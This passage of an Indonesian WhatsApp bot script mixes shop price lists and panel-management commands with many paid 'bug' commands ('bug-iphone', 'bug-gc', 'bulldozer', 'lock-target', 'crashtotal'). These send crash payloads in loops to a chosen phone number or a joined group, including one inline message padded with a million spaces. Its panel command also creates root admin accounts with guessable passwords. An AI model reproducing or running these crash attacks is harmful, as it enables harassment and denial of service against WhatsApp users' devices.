                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝙒𝙮͜𝙣ᯭ𝙯 𝙀𝙭͜𝙚𝙘ᯭ𝙪͜𝙩𝙞𝙫͡𝙚" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };


//fquoted 
const qloc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `𝕮𝖗𝖊𝖆𝖙𝖊𝖉 𝕭𝖞 𝕯𝖎𝖐𝖆𝖙𝖔𝖐𝖎`,jpegThumbnail: await reSize("./image/button.jpg", 200, 200) }}}
const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363322427078436@newsletter`,
newsletterName: `Hore`,
jpegThumbnail: "",
caption: `𝑮𝑨𝑴𝑴𝑨-𝑩𝑶𝑻`,
inviteExpiration: Date.now() + 1814400000
}
}
}
const qJpm = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363322427078436@newsletter`,
newsletterName: `B R O A D C A S T`,
jpegThumbnail: "",
caption: `BROADCAST - MESSAGE`,
inviteExpiration: Date.now() + 1814400000
}
}
}
// Function Reply
async function reply(teks) {
const nedd = {
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: namabot,
newsletterJid: chjid + "@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: `Created By Dikatoki`,
body: ``,
previewType: "PHOTO",
thumbnailUrl: global.imageurl, 
sourceUrl: ucch, 
},
},
text: teks,
};
return client.sendMessage(m.chat, nedd, {quoted: m,});
}

async function DikzReply(teks) {
            const po = {
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `© 𝑮𝑨𝑴𝑴𝑨-𝑩𝑶𝑻`,
                            body: `${namabot}`,
                            thumbnailUrl: global.imageurl,                                        sourceUrl: '',
                            mediaType: 1,
                            renderLargerThumbnail: false
                    }
                },
                text: teks
            };
            return client.sendMessage(m.chat, po, { quoted: m }
            );
        };
        
        const pluginsLoader = async (directory) => {
            let plugins = [];
            const folders = fs.readdirSync(directory);
            folders.forEach(file => {
                const filePath = path.join(directory, file);
                if (filePath.endsWith(".js")) {
                    try {
                        const resolvedPath = require.resolve(filePath);
                        if (require.cache[resolvedPath]) {
                            delete require.cache[resolvedPath];
                        }
                        const plugin = require(filePath);
                        plugins.push(plugin);
                    } catch (error) {
                        console.log(`${filePath}:`, error);
                    }
                }
            });
            return plugins;
        };

        const pluginsDisable = true;
        const plugins = await pluginsLoader(path.resolve(__dirname, "./plugins"));
        const plug = { client, prefix, command, reply, text, isOwner, reaction, isGroup: m.isGroup, isPrivate: !m.isGroup, pushname, mime, quoted, sleep, fetchJson };

        for (let plugin of plugins) {
            if (plugin.command.find(e => e == command.toLowerCase())) {
                if (plugin.owner && !isOwner) {
                    return reply(mess.owner);
                }
                
                if (plugin.group && !plug.isGroup) {
                    return reply(mess.group);
                }
                
                if (plugin.private && !plug.isPrivate) {
                    return reply(mess.private);
                }

                if (typeof plugin !== "function") return;
                await plugin(m, plug);
            }
        }
        
        if (!pluginsDisable) return;  


        switch (command) {
            //
         case 'payment': case 'nope': {
let teks = `*NOMOR PEMBAYARAN DIKZZ-SHOP:* 

*Dana:* 0822-1974-5315
A/n: An****
*Gopay:* 0858-5018-5698
A/n: Ah****
*Shopee pay:* 0856-4921-2256
A/n: Ji****
*Ovo:* 0858-5018-5698
A/n: D**** 

*NOTE:* 
_Wajib membawa bukti tf setelahnya_
_All trx no reff_`
client.sendMessage(from, { 
text: teks,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": false,
"title": `QRIS? KLIK DISINI`,
"body": `Date : ${wib}, ${tanggal}`,
"containsAutoReply": true,
"mediaType": 1, 
"thumbnailUrl": "https://pomf2.lain.la/f/pa69rb8o.jpg",
"sourceUrl": "https://pomf2.lain.la/f/pa69rb8o.jpg"
}
}
},{ 
quoted: fkontak })
await sleep(1500)
}
      break
case "harganokos":
return DikzReply(`*❑ LIST HARGA NOKOS WHATSAPP BY DIKZZ*
> - 🇮🇩Nokos indo[+62]: 5.000
> - 🇵🇭Nokos philipin[+63]: 7.000
> - 🇹🇭Nokos thailand[+66]: 7.000
> - 🇲🇾Nokos malay[+60]: 9.000
> - 🇨🇳Nokos china[+86]: 11.000
> - 🇻🇳Nokos vietnam[+84]: 6.000
> - 🇮🇳Nokos india[+91]: 10.000
> - 🇳🇱Nokos belanda[+31]: 13.000
> - 🇮🇱Nokos israel[+972]: 15.000
> - 🇨🇴Nokos kolombia[+57]: 10.000
> - 🇺🇸Nokos amerika[+1]: 20.000
> - 🇧🇷Nokos brazil[+55]: 13.000

*❑ LIST NOKOS TELEGRAM BY DIKZZ*
> - 🇮🇩Nokos indo[+62]: 5.000
> - 🇲🇾Nokos malay[+60]: 11.000
> - 🇨🇳Nokos china[+86]: 6.000
> - 🇵🇭Nokos philipina[+63]: 6.000
> - 🇹🇭Nokos thailand[+66]: 11.000

*Open juga murnokos* harga 5k dijamin balmod

> #Dont copy my text. If you copy my text you will be fined

*My contact*
wa.me/6285708112935
t.me/dikatoki111
*Testimoni*
https://whatsapp.com/channel/0029ValalxrICVfeUyTSrV1O`)
 break
 case "setppbot": case "setpp": {
if (!isOwner) return reply(mess.only.owner)
if (/image/g.test(mime)) {
let media = await client.downloadAndSaveMediaMessage(qchanel)
await client.updateProfilePicture(botNumber, {url: media})
await fs.unlinkSync(media)
reply("*Berhasil Mengganti Profil ✅*")
} else return reply(example('dengan mengirim foto'))}
break
case "setppbotpanjang": case "setpppanjang": {
if (!isOwner) return reply(mess.only.owner)
if (/image/g.test(mime)) {
var medis = await client.downloadAndSaveMediaMessage(qchanel, 'ppbot.jpeg', false)
var { img } = await generateProfilePicture(medis)
await client.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
await fs.unlinkSync(medis)
reply("*Berhasil Mengganti Profil ✅*")
} else return reply(example('dengan mengirim foto'))
}
break
case "hargapanel": 
return DikzReply(`*❑ LIST HARGA PANEL PRIVATE BY DIKZZ*
> *📦RAM 1GB  📠CPU 20%* = 1.000
> *📦RAM 2GB  📠CPU 40%* = 2.000
> *📦RAM 3GB  📠CPU 60%* = 3.000
> *📦RAM 4GB  📠CPU 80%* = 4.000
> *📦RAM 5GB  📠CPU 100%* = 5.000
> *📦RAM 6GB 📠CPU 120%* = 6.000
> *📦RAM 7GB  📠CPU 140%* = 7.000
> *📦RAM 8GB  📠CPU 160%* = 8.000
> *📦RAM 9GB  📠CPU 180%* = 9.000
> *📦RAM 10GB  📠CPU 200%* = 10.000
> *📦RAM UNLIMITED  📠CPU UNLIMITED* = 12.000 (kecuali ada diskon)
> *📦RESELLER PANEL PRIVATE* = 5.000

🗣️: Apa perbedaan panel publik sama panel private bang?
👤: Klo panel publik itu panel yang open adp. Tapi kalo panel private itu cuma open reseller panel doang.

*Keuntungan buy Panel private by dikzz:*
> • Pembelian di atas 5.000 dapat bonus sc bot
> • Free tutor pemasangan
> • Bot on 24 jam
> • Anti delay"
> • Anti kecolongan sc
> • Anti intip 
> • Bergaransi
> • Berkualitas

*CONTACT PERSON*
[Dikzz]
wa.me/6285708112935
t.me/dikatoki111
[Arzero]
wa.me/6289686617846

*TESTIMONI*
https://whatsapp.com/channel/0029ValalxrICVfeUyTSrV1O

> _♛Dikzz_`)
break
case 'kontol2': {
if (!isMurbug) return reply("*KHUSUS MURBUG*")
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗦𝗘𝗡𝗗𝗘𝗥 𝗕𝗨𝗚 𝗖𝗥𝗔𝗦𝗛")
for (let i = 0; i < 50; i++) {
await Delaybang(target, Null)
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
}
break
case "setnamabot": {
if (!isOwner) return reply(mess.only.owner)
if (!text) return reply(example('teksnya'))
client.updateProfileName(text)
reply("*Berhasil Mengganti Nama Bot ✅*")
}
break
case "setbio": case "setbiobot": {
if (!isOwner) return reply(mess.only.owner)
if (!text) return reply(example('teksnya'))
client.updateProfileStatus(text)
reply("*Berhasil Mengganti Bio Bot ✅*")
}
break
case "sound1": {
await client.sendMessage(m.chat, {audio: {url: `${sound1}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break
case "sound2": {
await client.sendMessage(m.chat, {audio: {url: `${sound2}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break
case "sound3": {
await client.sendMessage(m.chat, {audio: {url: `${sound3}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break
case "sound4": {
await client.sendMessage(m.chat, {audio: {url: `${sound4}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break
case "sound5": {
await client.sendMessage(m.chat, {audio: {url: `${sound5}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break
case "sound6": {
await client.sendMessage(m.chat, {audio: {url: `${sound6}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break
case 'bug-saluran': {
if (!isMurbug) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} https://whatsapp.com/channel/`)
reply(`In proses....`)
let result = args[0].split('https://whatsapp.com/channel/')[1];
let target = await client.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰𝚜𝚕𝚒𝚖𝚎𝚌𝚛𝚊𝚜𝚑 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #Kenzoxtzy"
    },
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}  ), { userJid: m.chat, quoted: dikatoki })
await client.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
reply(`<✓> Successfully Send Bug to ${target} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'proses': {
if (!isOwner);
	let t = text.split(',');
	if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} barang,nominal,payment`);
	let barang = t[0];
	let nominal = t[1];
	let payment = t[2];

	reply(`━━━━[ *TRANSAKSI SEDANG DI PROSES* ]━━━━
📦 *BARANG:* *${barang}*
💰 *NOMINAL:* *Rp${nominal}*
📆 *TANGGAL:* *${hariini}*
💳 *PAYMENT:* *${payment}*

*MOHON DI TUNGGU KAK🙏*`)
}
break
case 'done': {
if (!isOwner);
	let t = text.split(',');
	if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} barang,nominal,payment`);
	let barang = t[0];
	let nominal = t[1];
	let payment = t[2];

	reply(`━━━━[ *TRANSAKSI DONE* ]━━━━
📦 *BARANG:* *${barang}*
💰 *NOMINAL:* *Rp${nominal}*
📆 *TANGGAL:* *${hariini}*
💳 *PAYMENT:* *${payment}*
✅ *STATUS:* *BERHASIL*

*TERIMA KASIH TELAH ORDER* *JANGAN LUPA ORDER LAGI YA*🙏`)
}
break
case "listprem": case "listpremium": {
if (premium.length < 1) return reply("Tidak Ada User Premium")
let teksnya = `*LIST USER PREMIUM⚡*\n\n`
premium.forEach(e => teksnya += `*Tag :* @${e.split("@")[0]}
*WhatsApp :* ${e.split("@")[0]}\n\n`)
client.sendMessage(m.chat, {text: teksnya, mentions: [...premium]}, {quoted: qtoko})
}
break
case "bug-iphone": case "iphone-ui": case "xios": case "iphone-killer":
case "iphone": {
if (!isMurbug) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 50; j++) {
await selios(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//case pinterest
case "pinterest": case "pin": {
if (!text) return reply(example("tobrut"))
reply(mess.wait)
let res = await pinterest(text)
if (res.length == 0) return reply("Error, Foto Tidak Ditemukan")
if (res.length < 5) {
anuan = res
} else {
anuan = res.slice(0,5)
}
let anu = new Array()
for (let ii of anuan) {
let imgsc = await prepareWAMessageMedia({ image: await fetch(`${ii}`)}, { upload: client.waUploadToServer })
anu.push({
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: true,
                ...imgsc
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {                  
                   name: "cta_url",
                   buttonParamsJson:  `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${ii}\",\"merchant_url\":\"https://www.google.com\"}`
                  }
                ]
              })
            })
}

const msgii = await generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.fromObject({
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: "🔎 Berikut Adalah Hasil Pencarian Foto Dari *Pinterest*"
        }),
        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
          cards: anu
        })
      })
    }
  }
}, {userJid: m.sender, quoted: m})
 
await client.relayMessage(m.chat, msgii.message, {
  messageId: msgii.key.id
})
}
break
 case 'remini': case 'hd': case 'hdr': {
if (!isMediaa) return reply(`Kirim/kutip gambar dengan caption ${prefix+command}`)
await client.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}})
const { remini } = require('./lib/remini')
let media = await quoted.download()
let proses = await remini(media, "enhance");
client.sendMessage(m.chat, { image: proses, caption: 'Sukses'}, { quoted: m})
}
break      
case "bug-gc": {
  
    if (!isMurbug) return reply(mess.only.prem)
    if (!text) {
      return reply("*HOW TO SEND BUG TO GROUP*\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
    }
    reply("please wait, " + command + " bug is in process..");
    if (!text.split(" ")[0].includes("whatsapp.com")) {
      return reply("Link Invalid!");
    }
    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
    try {
      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
      let groupTarget = await client.groupAcceptInvite(groupLink);
      await sleep(2000); // Adjusted sleep time for clarity
      await gabisaBuka(groupTarget)
      await sleep(2500); // Adjusted sleep time for clarity
      reply("*DONEâœ… BUG HAS BEEN SENT TO THE GROUP!.*");
     client.groupLeave(groupTarget);
    } catch (error) {
      reply(util.format(error));
    }
  }
  break
case 'ownhardui':
if (!isOwner) return
reply (mess.owner)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 70; i++) {
await bulldozer(target)
}
reply(bugres)
break
case "cadp":
case "createadp": {
if (!isOwner) return reply(mess.owner)

let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username + "019"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
*</> ADP TELAH SUKSES DI BUAT
`
    const listMessage = {

        text: tks,

    }

	

    await client.sendMessage(m.chat, listMessage)

    await client.sendMessage(nomornya, {

        text: `*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n

👤USERNAME :  ${username}
🔑PASSWORD: ${password}
🌐LOGIN: ${domain}

*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*


`,

    })

} 
        break
        case "listadp": {
  if (!isOwner) return reply(mess.owner);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await client.sendMessage(m.chat, { text: messageText }, { quoted: m });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break
case 'delay-maker': 
if (!isMurbug) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 70; i++) {
await sleep(5000)
//await XeonButtNew(target)
await CarouselNew(target)
}
reply(`*_<\> 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐍𝐆𝐈𝐑𝐈𝐌𝐊𝐀𝐍 𝐁𝐔𝐆 𝐊𝐄 𝐓𝐀𝐑𝐆𝐄𝐓 </>_*`)
break
case 'bulldozer':
case 'xtream-bug': 
if (!isMurbug) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 600; i++) {
await bulldozer(target)
}
reply(`*_<\> 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐍𝐆𝐈𝐑𝐈𝐌𝐊𝐀𝐍 𝐁𝐔𝐆 𝐊𝐄 𝐓𝐀𝐑𝐆𝐄𝐓 </>_*`)
break
case "trxoff": case "modeoff": {
if (!isOwner) return reply(mess.owner)
global.owneroff = true
reply('Berhasil Mengganti Ke Mode *Owner Off*')
}
break
case "trxon": case "modeon": {
if (!isOwner) return reply(mess.owner)
global.owneroff = false
reply('Berhasil Mengganti Ke Mode *Owner ON*')
}
break
case 'crashtotal':
if (!isOwner) return reply(mess.only.owner)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 100; i++) {
await crashNewsletter(target)
}
reply(`*_<\> 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐍𝐆𝐈𝐑𝐈𝐌𝐊𝐀𝐍 𝐁𝐔𝐆 𝐊𝐄 𝐓𝐀𝐑𝐆𝐄𝐓 </>_*`)
break
case "addseller":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285718281578`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await client.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
seler.push(prrkek)
fs.writeFileSync("./database/resel.json", JSON.stringify(seler))
reply(`Nomor ${prrkek} Telah Menjadi Reseller panel`)
}
break
case "delseller":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285718281578`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = seler.indexOf(ya)
seler.splice(unp, 1)
fs.writeFileSync("./database/resel.json", JSON.stringify(seler))
reply(`Nomor ${ya} Telah Di Hapus dari database reseller`)
}
break
case 'lock-target':
if (!isMurbug) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 50; i++) {
await Freezebugg(target)
await newvirpen(target)
await newcall(target)
await newcall2(target)
await newcall3(target)
await newcall4(target)
}
reply(`*_<\> 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐍𝐆𝐈𝐑𝐈𝐌𝐊𝐀𝐍 𝐁𝐔𝐆 𝐊𝐄 𝐓𝐀𝐑𝐆𝐄𝐓 </>_*`)
break
case "dmml": case "diamondml": case "dmmole": case "topupml":
return DikzReply(`*❑ LIST HARGA DIAMONDS MOBILE LEGENDS BY DIKZZ*
> *💎 5 diamonds (bonus 0)* = 2.000
> *💎 11 diamonds (bonus 1)* = 4.000
> *💎 17 diamonds (bonus 2)* = 6.000
> *💎 25 diamonds (bonus 3)* = 9.000
> *💎 40 diamonds (bonus 4)*= 13.000
> *💎 53 diamonds (bonus 6)*= 17.000
> *💎 77 diamonds (bonus 8)* = 25.000
> *💎 102 diamonds (bonus 11)* = 32.000
> *💎 154 diamonds (bonus 16)* = 49.000
> *💎 220 diamonds (bonus 20)*  = 68.000
> *💎 254 diamonds (bonus 25)* = 73.000
> *💎 300 diamonds (bonus 45)* = 98.000
> *💎 325 diamonds (bonus 49)* = 106.000
> *💎 500 diamonds (bonus 22)* = 150.000
> *💎 1036 diamonds (bonus 100)* = 310.000
> *💎 2000 diamonds (bonus 180)* = 565.000
> *🛒 Twilight pass* = 157.000
> *🛒 Weekly diamond pass* = 30.000
> *🛒 Weekly diamond pass×2* = 59.000

 *KEUNTUNGAN TOP-UP DI DIKZZ-SHOP:*
- Proses cepat
- Harga murah
- Diamond legal bukan ilegall
- Anti scam/penipuan
- Dapat bonus

*CONTACT PERSON*
> Wa: wa.me/6285708112935
> Telegram:  t.me/dikatoki111
*TESTIMONI*
> https://whatsapp.com/channel/0029ValalxrICVfeUyTSrV1O`)
break
case "topupff": case "listdmff": case "diamondff":
return reply(`*❑ LIST HARGA DIAMOND FREE FIRE BY DIKZZ*
> *💎 10 diamonds* = 1.500
> *💎 15 diamonds* = 2.500
> *💎 20 diamonds* = 3.000
> *💎 30 diamonds* = 5.000
> *💎 40 diamonds* = 6.200
> *💎 50 diamonds* = 7.000
> *💎 70 diamonds* = 9.000
> *💎 100 diamonds* = 14.000
> *💎 120 diamonds* = 15.500
> *💎 150 diamonds* = 17.500
> *💎 200 diamonds* = 26.000
> *💎 280 diamonds* = 34.000
> *💎 355 diamonds* = 43.000
> *💎 475 diamonds* = 60.000
> *💎 520 diamonds* = 65.000
> *💎 800 diamonds* = 94.000
> *💎 1000 diamonds* = 118.000
> *💎 1510 diamonds*= 180.000
> *💎 2000 diamonds* = 235.000
> *💎 3640 diamonds* = 420.000
> *💎 4450 diamonds* = 585.000
> *🛒 Level up pass* = 15.000
> *🛒 Bp card* = 41.000
> *🛒 Membership mingguan* = 28.000
> *🛒 Membership bulanan* = 79.000

*Keuntungan Topup di Dikzz-shop:*
- Proses Kilat
- Aman
- Murah
- Diamond legal, bukan ilegal
- Anti scam/penipuan

*Contact person*
> *Wa:* wa.me/6285708112935
> *Tele:* t.me/dikatoki111
*Testimoni*
https://whatsapp.com/channel/0029ValalxrICVfeUyTSrV1O`)      
break
case 'reinstall': {
if (!isOwner) return reply(`*Khusus owner goblok*`)
let srv = args[0]
if (!srv) return m.reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv + "/reinstall", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('Server tidak ditemukan')
m.reply('Mereinstall server...')
}
break
case "joingc": case "join": {
if (!isOwner) return reply(mess.owner)
if (!text && !m.quoted) return m.reply(example('linknya'))
let teks = m.quoted ? m.quoted.text : text
if (!teks.includes('whatsapp.com')) return m.reply("Link Tautan Tidak Valid!")
let result = teks.split('https://chat.whatsapp.com/')[1]
await client.groupAcceptInvite(result).then(respon => m.reply("Berhasil Bergabung Ke Dalam Grup ✅")).catch(error => m.reply(error.toString()))
}
break
case "del": case "delete": {
{
client.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
if (!isOwner) return reply(mess.owner)
if (!m.quoted) return m.reply("Reply Pesan Yang Ingin Di Hapus")
client.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}}
break
case 'addcase': {
if (!isOwner) return reply(mess.only.owner)
if (!text) return m.reply(`Contoh: ${prefix+command} case nya`);
const namaFile = path.join(__dirname, 'message.js');
const caseBaru = `${text}\n\n`;
const tambahCase = (data, caseBaru) => {
const posisiDefault = data.lastIndexOf("default:");
if (posisiDefault !== -1) {
const kodeBaruLengkap = data.slice(0, posisiDefault) + caseBaru + data.slice(posisiDefault);
return { success: true, kodeBaruLengkap };
} else {
return { success: false, message: "Tidak dapat menemukan case default di dalam file!" };
}};
fs.readFile(namaFile, 'utf8', (err, data) => {
if (err) {
console.log('Terjadi kesalahan saat membaca file:', err);
return m.reply(`Terjadi kesalahan saat membaca file: ${err.message}`);
}
const result = tambahCase(data, caseBaru);
if (result.success) {
fs.writeFile(namaFile, result.kodeBaruLengkap, 'utf8', (err) => {
if (err) {
console.log('Terjadi kesalahan saat menulis file:', err);
return m.reply(`Terjadi kesalahan saat menulis file: ${err.message}`);
} else {
console.log('Sukses menambahkan case baru:');
console.log(caseBaru);
return m.reply('Sukses menambahkan case!');
}});
} else {
console.log(result.message);
return m.reply(result.message);
}});
}
break

case 'delcase': {
if (!isOwner) return reply(mess.only.owner)
if (!text) return m.reply(`Contoh: ${prefix+command} nama case`);
const fs = require('fs').promises;
async function dellCase(filePath, caseNameToRemove) {
try {
let data = await fs.readFile(filePath, 'utf8');
const regex = new RegExp(`case\\s+'${caseNameToRemove}':[\\s\\S]*?break`, 'g');
const modifiedData = data.replace(regex, '');
if (data === modifiedData) {
m.reply('Case tidak ditemukan atau sudah dihapus.');
return;
}
await fs.writeFile(filePath, modifiedData, 'utf8');
m.reply('Sukses menghapus case!');
} catch (err) {
m.reply(`Terjadi kesalahan: ${err.message}`);
}}
dellCase('./message.js', q);
break;
}
case "getcase": {
if (!isOwner) return reply(mess.only.owner)
if (!text) return reply(example("menu"))
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./message').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
reply(`${getcase(q)}`)
} catch (e) {
return reply(`Case *${text}* Tidak Ditemukan`)
}
}
break
case "hidetag": {
if (!isOwner) return reply(`*_Khusus admin_*`)
if (!isGroup) return reply(mess.only.group)
if (!q) return reply(`Teks?`)
global.hit = q
client.sendMessage(from, { text : global.hit ? global.hit : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}			
break
case "addowner": 
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await client.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
ownerNumber.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`);
break
case "pinterest2": case "pin2": {
if (!text) return m.reply(example("tobrut"))
m.reply(mess.wait)
await pinterest(text).then((res) => {
if (res.length < 1) return m.reply("Error, Foto Tidak Ditemukan")
let jumlah = 5
if (res.length < jumlah) jumlah = res.length
for (let e = 0; e < jumlah; e++) {
client.sendMessage(m.chat, {image: {url: res[e]}, caption: "Done Bang ✅"}, {quoted: m})
}
}).catch(e => m.reply(e.toString()))
}
break
case "pembuatsc":
case "creator":
case "owner": {
let list = []
for (let i of ownerNumber) {
list.push({
displayName: await lox.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
